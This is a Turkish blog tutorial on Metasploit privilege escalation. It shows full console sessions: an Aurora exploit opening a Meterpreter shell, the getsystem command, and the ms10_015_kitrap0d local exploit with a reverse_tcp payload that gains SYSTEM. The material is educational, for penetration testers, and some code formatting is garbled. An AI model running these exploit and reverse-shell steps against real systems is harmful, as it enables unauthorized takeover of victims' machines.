---
draft: false

title:  'MSF Yetki Yükseltme'
date: '2017-05-25T13:16:00+03:00'
author: İbrahim Korucuoğlu ([@siberoloji](https://github.com/siberoloji))

description:  'Bu yazımızdan itibaren yetki yükseltme olarak ifade edilen (İng: Privilege Escalation) kavramı inceleyeceğiz. Karşı sisteme erişim sağlayan güvenlik denetçisini bu aşamadan itibaren ilerleme sağlamayı hedeflemelidir. Ağda devam eden iletişimi kontrol etme, hash değerlerini elde etme bunlara örnek olarak verilebilir. Bir diğer hedef ise, bu bilgisayarı basamak olarak kullanarak (İng: Pivoting) başka bilgisayarlara erişim sağlamak olmalıdır.' 
 
url:  /tr/msf-yetki-yukseltme/
 
featured_image: /images/metasploit.jpg
categories:
    - 'Metasploit Framework'
tags:
    - cybersecurity
    - 'metasploit framework'
---


## Ya sonra?



Bir sistemin zafiyetini bulmak için gerekli çalışmaları yaptınız. Açık noktasını buldunuz ve doğru adımları uyguladıktan sonra hedef bilgisayarda bir komut satırı açmayı başardınız. Peki bundan sonra ne yapılmalı?



Bu yazımızdan itibaren yetki yükseltme olarak ifade edilen (İng: Privilege Escalation) kavramı inceleyeceğiz. Karşı sisteme erişim sağlayan güvenlik denetçisini bu aşamadan itibaren ilerleme sağlamayı hedeflemelidir. Ağda devam eden iletişimi kontrol etme, hash değerlerini elde etme bunlara örnek olarak verilebilir. Bir diğer hedef ise, bu bilgisayarı basamak olarak kullanarak (İng: Pivoting) başka bilgisayarlara erişim sağlamak olmalıdır.



Kullandığınız zafiyet ve buna yönelik exploit modülü karşı bilgisayarda oturum açmanıza yaramış olsa bile yetkisiz bir oturum açmış olabilirsiniz. Bu durumda yapabileceğiniz işlemler kısıtlı olacaktır. Böyle durumlar için Metasploit Framework içerisinde bulunan bir kaç alternatif modül bulunmaktadır. bunlardan bir tanesi de `getsystem` komutudur.



## Yetkisiz Oturum



Aşağıdaki örnekte görüldüğü gibi, hedef sistemde `ms10_002_aurora` modülü kullanılarak yetkisiz bir meterpreter oturumu açılmıştır.


```bash
msf exploit**(**ms10_002_aurora**)** **&gt;**
**[*********]** Sending Internet Explorer "Aurora" Memory Corruption to client 192.168.1.161
**[*********]** Sending stage **(**748544 bytes**)** to 192.168.1.161
**[*********]** Meterpreter session 3 opened **(**192.168.1.71:38699 -&gt; 192.168.1.161:4444**)** at 2010-08-21 13:39:10 -0600

msf exploit**(**ms10_002_aurora**)** **&gt;** sessions -i 3
**[*********]** Starting interaction with 3...

meterpreter **&gt;** getuid
Server username: XEN-XP-SP2-BARE\victim
meterpreter **&gt;**
```



## GetSystem



`getsystem` komutunu kullanabilmek için öncelikle `priv` eklentisini sisteme yükleyelim.


```bash
meterpreter **&gt;** use priv
Loading extension priv...success.
meterpreter **&gt;**
```



`getsystem -h` komutunda olduğu gibi `-h` parametresini kullandığınızda kullanılabilir seçenekleri görebilirsiniz.



``sh meterpreter &gt; getsystem -h Usage: getsystem [options]



Attempt to elevate your privilege to that of local system.



OPTIONS:


```bash
-h        Help Banner.
-t &lt;opt&gt;  The technique to use. (Default to '0').
0 : All techniques available
1 : Service - Named Pipe Impersonation (In Memory/Admin)
2 : Service - Named Pipe Impersonation (Dropper/Admin)
3 : Service - Token Duplication (In Memory/Admin)
```



meterpreter &gt;


```bash

```getsystem
``` komutuna hiçbir parametre vermezseniz, varsayılan olarak tüm ihtimalleri deneyecektir. 

```sh
meterpreter &gt; getsystem
...got system (via technique 1).
meterpreter &gt; getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter &gt;
```



## Yerel Exploit Kullanma



Bazı durumlarda `getsystem` başarısız olur. Aşağıda bunun örneğini görebilirsiniz. `getsystem` başarısız olduğunda oturumu arka plana gönderip, Metasploit Framework içerisindeki diğer exploit modüllerini kullanmak gerekmektedir.


```bash
meterpreter **&gt;** getsystem
**[**-] priv_elevate_getsystem: Operation failed: Access is denied.
meterpreter **&gt;**
```



Yukarıda başarısız olmuş bir `getsystem` komutu çıktısı görülüyor. Şimdi bunu arka plana gönderelim ve kullanılabilir durumdaki yerel exploit modüllerine bakalım.


```bash
meterpreter **&gt;** background
**[*********]** Backgrounding session 1...
msf exploit**(**ms10_002_aurora**)** **&gt;** use exploit/windows/local/
...snip...
use exploit/windows/local/bypassuac
use exploit/windows/local/bypassuac_injection
...snip...
use exploit/windows/local/ms10_015_kitrap0d
use exploit/windows/local/ms10_092_schelevator
use exploit/windows/local/ms11_080_afdjoinleaf
use exploit/windows/local/ms13_005_hwnd_broadcast
use exploit/windows/local/ms13_081_track_popup_menu
...snip...
msf exploit**(**ms10_002_aurora**)** **&gt;**
```



Bu listedeki modüllerden `exploit/windows/local/ms10_015_kitrap0d` modülünü kullanalım.


```bash
msf exploit**(**ms10_002_aurora**)** **&gt;** use exploit/windows/local/ms10_015_kitrap0d
msf exploit**(**ms10_015_kitrap0d**)** **&gt;** set SESSION 1
msf exploit**(**ms10_015_kitrap0d**)** **&gt;** set PAYLOAD windows/meterpreter/reverse_tcp
msf exploit**(**ms10_015_kitrap0d**)** **&gt;** set LHOST 192.168.1.161
msf exploit**(**ms10_015_kitrap0d**)** **&gt;** set LPORT 4443
msf exploit**(**ms10_015_kitrap0d**)** **&gt;** show options

Module options **(**exploit/windows/local/ms10_015_kitrap0d**)**:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  1                yes       The session to run this module on.


Payload options **(**windows/meterpreter/reverse_tcp**)**:

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique **(**accepted: seh, thread, process, none**)**
   LHOST     192.168.1.161    yes       The listen address
   LPORT     4443             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows 2K SP4 - Windows 7 **(**x86**)**


msf exploit**(**ms10_015_kitrap0d**)** **&gt;** exploit

**[*********]**  Started reverse handler on 192.168.1.161:4443 
**[*********]**  Launching notepad to host the exploit...
**[**+]  Process 4048 launched.
**[*********]**  Reflectively injecting the exploit DLL into 4048...
**[*********]**  Injecting exploit into 4048 ...
**[*********]**  Exploit injected. Injecting payload into 4048...
**[*********]**  Payload injected. Executing exploit...
**[**+]  Exploit finished, wait **for** **(**hopefully privileged**)** payload execution to complete.
**[*********]**  Sending stage **(**769024 bytes**)** to 192.168.1.71
**[*********]**  Meterpreter session 2 opened **(**192.168.1.161:4443 -&gt; 192.168.1.71:49204**)** at 2014-03-11 11:14:00 -0400
```



Gerekli modül ve payload ayarlarını yaptıktan sonra çalıştırılan exploit, hedef sistemde bir oturum açmayı başarmıştır. Şimdi `getuid` komutunu verdiğimizde `SYSTEM` yetkili bir kullanıcı gibi hareket edilebileceği aşağıda görülmektedir.


```bash
meterpreter **&gt;** getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter **&gt;**```
